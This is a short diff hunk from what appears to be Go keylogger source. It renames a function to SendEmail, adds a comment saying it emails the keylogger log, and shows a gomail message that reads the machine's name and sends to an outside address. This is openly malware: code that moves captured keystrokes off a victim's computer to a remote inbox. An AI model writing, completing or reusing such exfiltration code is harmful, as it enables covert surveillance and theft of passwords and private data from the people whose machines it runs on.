@@ -15,7 +15,8 @@ var (
 	username   = os.Getenv("COMPUTERNAME")
 )
 
-func Send() {
+//SendEmail sends the keylogger log by email
+func SendEmail() {
 	m := gomail.NewMessage()
 	m.SetHeader("From", from)
 	m.SetHeader("To", "xorexa6205@zcai77.com")
